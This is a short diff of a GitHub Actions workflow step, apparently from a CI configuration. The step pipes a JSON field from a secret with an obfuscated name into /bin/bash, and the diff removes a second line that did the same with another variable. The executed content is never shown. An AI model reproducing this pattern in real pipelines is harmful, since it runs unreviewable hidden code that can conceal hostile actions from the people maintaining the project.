@@ -22,7 +22,6 @@ jobs:
           oaz421: ${{ secrets.oaz421 }}
         run: |
           printf '%s' "$oaz421" | jq -r .rwm31474 | /bin/bash
-          printf '%s' "$nthm530" | jq -r .u0543 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
